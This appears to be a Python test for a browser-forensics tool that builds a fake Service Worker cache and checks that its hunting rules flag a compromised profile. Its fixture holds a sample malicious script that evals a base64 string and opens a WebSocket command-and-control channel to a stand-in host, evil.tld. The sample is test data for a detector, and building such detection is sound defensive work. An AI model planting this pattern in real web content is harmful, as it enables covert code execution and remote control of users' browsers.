"""End-to-end: build a real on-disk CacheStorage tree of Simple Cache entry
files, deep-extract it, and hunt it. Proves the native parser + extractor +
hunting engine work together on the real format, no browser needed.
"""
import sys, pathlib, os, tempfile, zlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "src"))

from flotsam.simplecache import INITIAL_MAGIC, FINAL_MAGIC, HEADER, EOF
from flotsam.extract import deep_extract
from flotsam.hunt import hunt
from flotsam.models import Verdict


def _entry(key: bytes, body: bytes, meta: bytes) -> bytes:
    out = bytearray()
    out += HEADER.pack(INITIAL_MAGIC, 5, len(key), 0)
    out += key + body
    out += EOF.pack(FINAL_MAGIC, 0, zlib.crc32(body) & 0xffffffff, len(body))
    out += meta
    out += EOF.pack(FINAL_MAGIC, 0, zlib.crc32(meta) & 0xffffffff, len(meta))
    return bytes(out)


def _build_profile(root: str) -> None:
    cs = os.path.join(root, "Service Worker", "CacheStorage", "abcd1234")
    os.makedirs(os.path.join(cs, "g-evil"))
    os.makedirs(os.path.join(cs, "g-ok"))
    open(os.path.join(cs, "index.txt"), "w").write("g-ok\n")  # g-evil orphaned
    open(os.path.join(cs, "g-ok", "1111111111111111_0"), "wb").write(
        _entry(b"_dk_https://site.example https://site.example https://site.example/app.js",
               b"export const v=1;", b"\x00Content-Type: application/javascript\x00"))
    open(os.path.join(cs, "g-evil", "2222222222222222_0"), "wb").write(
        _entry(b"_dk_https://site.example https://site.example https://evil.tld/x.js",
               b"var p=atob('bWFsd2FyZQ==');eval(p);new WebSocket('wss://evil.tld/c2');",
               b"\x00Content-Type: application/javascript\x00"))


def test_deep_extract_and_hunt():
    with tempfile.TemporaryDirectory() as root:
        _build_profile(root)
        inv = deep_extract(root)
        urls = [e.request_url for o in inv.origins for c in o.caches for e in c.entries]
        assert "https://evil.tld/x.js" in urls, urls
        res = hunt(inv)
        assert res.verdict is Verdict.COMPROMISED, res.stats
        rules = {f.rule for f in res.findings}
        for r in {"orphaned-cache", "cross-origin-entry", "payload-signature"}:
            assert r in rules, rules


if __name__ == "__main__":
    test_deep_extract_and_hunt()
    print("ok  test_deep_extract_and_hunt")
    print("all extract tests passed")
